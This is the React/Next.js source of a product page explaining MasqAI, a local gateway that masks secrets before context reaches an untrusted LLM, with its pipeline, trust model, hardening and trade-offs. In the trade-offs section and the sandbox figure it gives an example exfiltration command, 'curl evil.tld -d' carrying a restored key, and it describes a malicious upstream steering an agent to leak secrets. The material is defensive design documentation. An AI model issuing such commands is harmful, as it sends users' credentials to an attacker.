import type { Metadata } from "next";
import Link from "next/link";
import {
  ArrowDown,
  ArrowLeft,
  ArrowRight,
  Ban,
  Binary,
  BrainCircuit,
  CircleSlash,
  Clock,
  Copy,
  Cpu,
  DatabaseZap,
  EyeOff,
  FileSearch,
  FileWarning,
  Filter,
  Gauge,
  KeyRound,
  Laptop,
  Link2,
  Lock,
  RadioTower,
  RotateCcw,
  ScanEye,
  ShieldCheck,
  ShieldQuestion,
  Shrink,
  Sparkles,
  TriangleAlert,
  Variable,
  Box,
  Boxes,
  WifiOff,
  type LucideIcon,
} from "lucide-react";
import { PageIntro } from "@/components/site/page-bits";

export const metadata: Metadata = {
  title: "How it works",
  description: "MasqAI's pipeline, why rules alone aren't enough, its trust model, hardening, and the trade-offs it makes.",
};

export default function HowItWorksPage() {
  return (
    <div className="mx-auto max-w-7xl space-y-14 px-4 py-8 sm:px-6 sm:py-10">
      <PageIntro eyebrow="How it works" title="A firewall for context, on your machine">
        MasqAI listens on <code className="font-mono text-foreground">127.0.0.1:8787</code> and speaks the OpenAI and
        Anthropic wire formats. The <strong className="text-foreground">security model</strong> inspects every request
        inline, before anything reaches the <strong className="text-foreground">untrusted model</strong>.
      </PageIntro>

      <section aria-labelledby="pipeline-title" className="space-y-4">
        <h2 id="pipeline-title" className="text-2xl font-semibold">
          The pipeline
        </h2>
        <Pipeline />
      </section>

      <section aria-labelledby="daytona-title" className="space-y-4">
        <h2 id="daytona-title" className="text-2xl font-semibold">
          MasqAI protects the context; Daytona contains the actions
        </h2>
        <p className="max-w-3xl text-lg text-pretty text-muted-foreground">
          MasqAI controls what goes <em>out</em>. It can’t stop the untrusted model from telling the agent to run a harmful
          command. So in our evaluation, every command the model asks for runs in a fresh{" "}
          <strong className="text-foreground">Daytona</strong> sandbox: one per run, outbound network blocked, unique
          planted secrets, deleted afterwards, many in parallel.
        </p>
        <Containment />
      </section>

      <section aria-labelledby="regex-title" className="space-y-4">
        <h2 id="regex-title" className="text-2xl font-semibold">
          Why not just regex?
        </h2>
        <p className="max-w-3xl text-lg text-muted-foreground">
          Detectors run first: they are fast and can’t be prompt-injected. But rules alone have three flaws, and the
          security model exists to fix each one.
        </p>
        <ul className="grid gap-3 lg:grid-cols-3">
          <FlawFix
            flaw="Misses unknown formats"
            flawText="A Telegram bot token, a key fingerprint, a person’s name: no rule matches them."
            fix="The security model adds the masks the rules missed."
            icon={Sparkles}
          />
          <FlawFix
            flaw="False alarms"
            flawText={
              <>
                With username <code className="font-mono text-foreground">andy</code>, a naive rule also hits{" "}
                <code className="font-mono text-foreground">handy</code>.
              </>
            }
            fix="Auto masks stop at word boundaries. Copies inside a longer word go to the security model, which can also veto a wrong auto mask."
            icon={Copy}
          />
          <FlawFix
            flaw="Can’t link aliases"
            flawText={
              <>
                <code className="font-mono text-foreground">sk-or-v1-a3f…9e1</code> and the full key look unrelated to a
                regex.
              </>
            }
            fix="The security model marks aliases (<$…>) and relinks an earlier masked fragment to the full value."
            icon={Link2}
          />
        </ul>
      </section>

      <section aria-labelledby="trust-title" className="space-y-4">
        <h2 id="trust-title" className="text-2xl font-semibold">
          Trust model
        </h2>
        <div className="grid overflow-hidden rounded-xl border bg-card md:grid-cols-3">
          <TrustColumn
            icon={ShieldCheck}
            tone="text-restored"
            title="Trusted"
            items={[
              ["Gateway RAM", "Sessions, the mapping table and traces live only in process memory."],
              ["The security model", "Local by default. A remote one is refused unless you explicitly allow it."],
              ["The link to the next hop", "We assume no man-in-the-middle on the wire itself."],
            ]}
          />
          <TrustColumn
            icon={ShieldQuestion}
            tone="text-leak"
            title="Untrusted"
            items={[
              ["The filesystem", "Config, logs and caches at rest. Raw context, mappings and tokens never touch disk."],
              ["The untrusted model and everything behind it", "The provider, reseller, relay or agent app, and any gateway chained behind it."],
              ["Model output", "Treated as data. Only tool-call arguments are restored."],
            ]}
          />
          <TrustColumn
            icon={CircleSlash}
            tone="text-muted-foreground"
            title="Out of scope"
            items={[
              ["The agent’s own actions", "An agent that sends a secret it already holds, for example with curl. In our eval, Daytona contains them (above)."],
              ["A malicious provider steering the agent", "A small local model can’t correct an agent that is being steered."],
              ["A compromised host", "Malware that can read process memory wins."],
              ["Network identity", "Your IP address and TLS fingerprint still reach the endpoint."],
            ]}
          />
        </div>
      </section>

      <section aria-labelledby="hardening-title" className="space-y-4">
        <h2 id="hardening-title" className="text-2xl font-semibold">
          Hardening we did
        </h2>
        <ul className="grid gap-3 md:grid-cols-2 lg:grid-cols-3">
          <Item icon={KeyRound} title="Admin token on the control API">
            256 random bits per start, required as <code className="font-mono">x-masqai-token</code> on every{" "}
            <code className="font-mono">/api/*</code> call, compared in constant time, never written to disk.
          </Item>
          <Item icon={Ban} title="Cross-origin refusal">
            Browser requests from any other site are refused (<code className="font-mono">Sec-Fetch-Site</code>), and
            only loopback Host headers are accepted.
          </Item>
          <Item icon={Lock} title="Sandboxed CSP on proxied responses">
            Upstream bytes can never run as a page on the gateway’s origin: <code className="font-mono">sandbox</code>,{" "}
            <code className="font-mono">nosniff</code>, no framing, no upstream cookies.
          </Item>
          <Item icon={Gauge} title="Input size caps">
            64 MiB per response body, 8 MiB per stream frame, 8 Mi characters of buffered tool-call arguments.
          </Item>
          <Item icon={FileWarning} title="Masked error messages">
            Errors returned to clients are masked with the session’s known values and never echo exception text.
          </Item>
          <Item icon={Clock} title="RAM-only state, bounded">
            Nothing sensitive on disk. Idle sessions expire after 12 h, and at most 50 sessions are kept.
          </Item>
          <Item icon={Variable} title="Env var names frozen at startup">
            Provider keys are referenced by env var name. The GUI can reassign names from the startup set, but can’t
            add new ones.
          </Item>
        </ul>
      </section>

      <section aria-labelledby="costs-title" className="space-y-4">
        <h2 id="costs-title" className="text-2xl font-semibold">
          What we give up
        </h2>
        <p className="max-w-3xl text-lg text-muted-foreground">
          A context firewall is a trade. These are the costs we accept, and the ones the evaluation measures.
        </p>
        <ul className="grid gap-3 md:grid-cols-2 lg:grid-cols-3">
          <Item icon={Shrink} title="Lossy rephrasing">
            Hide and replace drop information. If the security model removes a line the task needed, the agent fails or
            asks again. Task success is tracked for exactly this reason.
          </Item>
          <Item icon={ScanEye} title="Imperfect detection">
            A 7B security model misses things. MasqAI lowers exposure; it does not make it zero.
          </Item>
          <Item icon={EyeOff} title="Meaning still leaks">
            Placeholders hide values, not intent. The untrusted model still learns what you are working on and the shape
            of your code.
          </Item>
          <Item icon={DatabaseZap} title="Cache vs. privacy on relink">
            A relink rewrites earlier messages to the <code className="font-mono">{"<$…>"}</code> form. That breaks the
            prompt cache prefix, which costs tokens and money. We accept it on purpose.
          </Item>
          <Item icon={Cpu} title="Local compute">
            Every request waits for the security model. That adds latency and needs a machine that can run a 7B model
            next to your work.
          </Item>
          <Item icon={TriangleAlert} title="Restore can be abused">
            A malicious upstream can ask for a tool call like{" "}
            <code className="font-mono">{'curl evil.tld -d "<KEY_…>"'}</code>, and MasqAI restores it. Accepted and
            documented: narrowing restore would break real tasks.
          </Item>
        </ul>
      </section>

      <div className="flex flex-wrap gap-3">
        <Link
          href="/demo"
          className="inline-flex min-h-11 items-center gap-2 rounded-md bg-primary px-5 font-medium text-primary-foreground hover:bg-primary/85"
        >
          Watch it on eight tasks <ArrowRight aria-hidden className="size-4" />
        </Link>
        <Link href="/run-it" className="inline-flex min-h-11 items-center gap-2 rounded-md border bg-card px-5 font-medium hover:bg-accent">
          Run it yourself
        </Link>
      </div>
    </div>
  );
}

// ---------- Daytona containment (CSS, no image) ----------

function Containment() {
  const verified: [string, string][] = [
    ["Fresh per run", "one sandbox per run, created in about 1.3 s, labeled with the run id"],
    ["Commands run there, not on the laptop", "the agent's bash tool executes inside the sandbox"],
    ["Outbound network blocked", "an exfiltration attempt fails: the internet can't be reached"],
    ["Clean measurement", "unique canaries per run, so a leak is never confused with another run's"],
    ["Nothing left behind", "deleted in finally, plus a label sweep after Ctrl-C"],
  ];
  return (
    <figure
      aria-label="Where each part runs: the agent loop, MasqAI and the untrusted model's endpoint on the laptop side; every command in a network-blocked Daytona sandbox."
      className="grid gap-4 rounded-xl border bg-card p-4 sm:p-6 lg:grid-cols-[1.1fr_1fr]"
    >
      <div className="flex flex-col gap-2">
        <div className="rounded-lg border bg-background p-3">
          <p className="flex items-center gap-2 font-semibold">
            <Laptop aria-hidden className="size-4" /> The laptop
          </p>
          <p className="mt-1 text-sm text-muted-foreground">
            The agent loop and MasqAI (localhost-only). The context goes out through MasqAI to the untrusted model.
          </p>
        </div>
        <div aria-hidden className="flex items-center justify-center gap-2 text-sm text-muted-foreground">
          <ArrowDown className="size-4" /> each tool call: <code className="font-mono">bash …</code>
        </div>
        <div className="relative rounded-lg border-2 border-dashed border-restored/60 p-3 pt-8">
          <p className="absolute top-2 left-3 flex items-center gap-1.5 text-sm font-medium text-restored">
            <Boxes aria-hidden className="size-4" /> Daytona · one sandbox per run, in parallel
          </p>
          <div className="rounded-md border bg-background p-3">
            <p className="flex items-center gap-2 font-semibold">
              <Box aria-hidden className="size-4" /> The command runs here
            </p>
            <p className="mt-1 flex items-center gap-1.5 text-sm text-leak">
              <WifiOff aria-hidden className="size-4" /> <code className="font-mono">curl evil.tld -d …</code> can’t reach the internet
            </p>
          </div>
        </div>
      </div>
      <div>
        <p className="font-semibold">Verified on a live sandbox</p>
        <ul className="mt-2 space-y-2">
          {verified.map(([title, detail]) => (
            <li key={title} className="flex gap-2">
              <ShieldCheck aria-hidden className="mt-0.5 size-4 shrink-0 text-restored" />
              <span>
                <span className="font-medium">{title}</span>
                <span className="text-muted-foreground"> · {detail}</span>
              </span>
            </li>
          ))}
        </ul>
        <p className="mt-3 text-sm text-muted-foreground">
          Reproduce with <code className="font-mono">python -m eval.daytona_check</code>; the repo’s{" "}
          <code className="font-mono">eval/README.md</code> lists every Daytona SDK call and why it’s there.
        </p>
      </div>
    </figure>
  );
}

// ---------- pipeline diagram (CSS, no image) ----------

type Exit = { status: string; label: string };

function Pipeline() {
  return (
    <figure
      aria-label="Outbound pipeline: agent, request hygiene, content extraction, detectors, auto masks, security model, untrusted model. Each blocking point has a fail-closed exit. The return path restores tool-call arguments only."
      className="space-y-4 rounded-xl border bg-card p-4 sm:p-6"
    >
      <div className="flex flex-col items-stretch gap-2">
        <ol className="lg:max-w-sm">
          <Node n={1} icon={Laptop} title="Agent" text="Coding agent or app, pointed at 127.0.0.1:8787." />
        </ol>
        <Arrow />
        <div className="relative flex-1 rounded-xl border-2 border-dashed border-restored/50 p-3 pt-9 sm:p-4 sm:pt-9">
          <p className="absolute top-2 left-3 flex items-center gap-1.5 text-sm font-medium text-restored">
            <ShieldCheck aria-hidden className="size-4" /> MasqAI gateway · your machine, RAM only
          </p>
          <ol className="flex flex-col items-stretch gap-2 lg:flex-row lg:items-start">
            <Node
              n={2}
              icon={Filter}
              title="Request hygiene"
              text="Strips fingerprinting headers, sets User-Agent to masqai/<version>, pseudonymizes user ids and cache keys."
              exits={[{ status: "404", label: "unsupported endpoint" }]}
            />
            <Arrow inList />
            <Node
              n={3}
              icon={FileSearch}
              title="Content extraction"
              text="Strict per API. Images and other opaque items are described, never read."
              exits={[{ status: "422", label: "unknown content type" }]}
            />
            <Arrow inList />
            <Node n={4} icon={Binary} title="Detectors" text="Rule tables for keys, PEM blocks, emails, tokens, credentials, host ids. Mask only." />
            <Arrow inList />
            <Node n={5} icon={Copy} title="Auto masks" text="Every exact copy of a known value, at word boundaries only." />
            <Arrow inList />
            <Node
              n={6}
              icon={BrainCircuit}
              title="Security model"
              text="Mask, alias, hide, replace, relink, veto. Invalid answer: one retry."
              accent
              exits={[
                { status: "502", label: "error, timeout or invalid twice" },
                { status: "refused", label: "remote model not allowed" },
              ]}
            />
          </ol>
        </div>
        <Arrow />
        <div className="relative rounded-xl border-2 border-dashed border-leak/50 p-3 pt-9 sm:p-4 sm:pt-9 lg:max-w-sm">
          <p className="absolute top-2 left-3 flex items-center gap-1.5 text-sm font-medium text-leak">
            <RadioTower aria-hidden className="size-4" /> Untrusted
          </p>
          <ol>
            <Node n={7} icon={RadioTower} title="Untrusted model" text="Sees placeholders, hidden bars and neutral substitutes." />
          </ol>
        </div>
      </div>

      <p className="flex items-start gap-3 rounded-lg border border-restored/50 bg-restored/8 p-3">
        <span className="mt-0.5 flex shrink-0 items-center text-restored">
          <ArrowLeft aria-hidden className="size-4" />
          <RotateCcw aria-hidden className="size-4" />
        </span>
        <span>
          <strong className="font-semibold text-restored">Return path: restore.</strong> In tool-call arguments only,
          placeholders become real values again, so the agent’s commands run on real paths. The untrusted model’s
          assistant text is never modified.
        </span>
      </p>
    </figure>
  );
}

function Node({
  n,
  icon: Icon,
  title,
  text,
  accent,
  exits = [],
}: {
  n: number;
  icon: LucideIcon;
  title: string;
  text: string;
  accent?: boolean;
  exits?: Exit[];
}) {
  return (
    <li className="flex min-w-0 flex-1 list-none flex-col gap-2">
      <div className={`rounded-lg border bg-background p-3 ${accent ? "border-model/70" : ""}`}>
        <p className="flex items-center gap-2 font-semibold">
          <span className="grid size-6 shrink-0 place-items-center rounded-full border font-mono text-xs">{n}</span>
          <Icon aria-hidden className={`size-4 shrink-0 ${accent ? "text-model" : ""}`} />
          {title}
        </p>
        <p className="mt-1 text-sm text-pretty text-muted-foreground">{text}</p>
      </div>
      {exits.map((e) => (
        <p key={e.label} className="flex items-start gap-1.5 rounded-md border border-leak/50 bg-leak/8 px-2 py-1 text-sm text-leak">
          <ArrowDown aria-hidden className="mt-0.5 size-3.5 shrink-0" />
          <span>
            <span className="sr-only">Fail closed exit: </span>
            <strong className="font-mono">{e.status}</strong> · {e.label}. Nothing sent.
          </span>
        </p>
      ))}
    </li>
  );
}

/** Between gateway stages: down on small screens, right on large ones. Between the three zones: always down. */
function Arrow({ inList }: { inList?: boolean }) {
  if (!inList)
    return (
      <div aria-hidden className="flex items-center text-muted-foreground lg:pl-16">
        <ArrowDown className="size-5 max-lg:mx-auto" />
      </div>
    );
  return (
    <li aria-hidden className="flex list-none items-center justify-center text-muted-foreground lg:mt-8">
      <ArrowDown className="size-5 lg:hidden" />
      <ArrowRight className="hidden size-5 lg:block" />
    </li>
  );
}

function FlawFix({ flaw, flawText, fix, icon: Icon }: { flaw: string; flawText: React.ReactNode; fix: string; icon: LucideIcon }) {
  return (
    <li className="flex flex-col rounded-lg border bg-card">
      <div className="p-4">
        <p className="flex items-center gap-2 font-semibold">
          <Binary aria-hidden className="size-4 text-muted-foreground" /> Rule flaw: {flaw}
        </p>
        <p className="mt-1 text-muted-foreground">{flawText}</p>
      </div>
      <div className="mt-auto border-t border-model/40 bg-model/8 p-4">
        <p className="flex items-center gap-2 font-semibold text-model">
          <Icon aria-hidden className="size-4" /> Security-model fix
        </p>
        <p className="mt-1">{fix}</p>
      </div>
    </li>
  );
}

function TrustColumn({
  icon: Icon,
  tone,
  title,
  items,
}: {
  icon: LucideIcon;
  tone: string;
  title: string;
  items: [string, string][];
}) {
  return (
    <div className="border-b p-5 last:border-b-0 md:border-r md:border-b-0 md:last:border-r-0">
      <h3 className={`flex items-center gap-2 text-lg font-semibold ${tone}`}>
        <Icon aria-hidden className="size-5" />
        {title}
      </h3>
      <ul className="mt-3 space-y-3">
        {items.map(([k, v]) => (
          <li key={k}>
            <p className="font-medium">{k}</p>
            <p className="text-muted-foreground">{v}</p>
          </li>
        ))}
      </ul>
    </div>
  );
}

function Item({ icon: Icon, title, children }: { icon: LucideIcon; title: string; children: React.ReactNode }) {
  return (
    <li className="rounded-lg border bg-card p-4">
      <p className="flex items-center gap-2 font-semibold">
        <Icon aria-hidden className="size-5 text-muted-foreground" />
        {title}
      </p>
      <p className="mt-2 text-pretty text-muted-foreground">{children}</p>
    </li>
  );
}
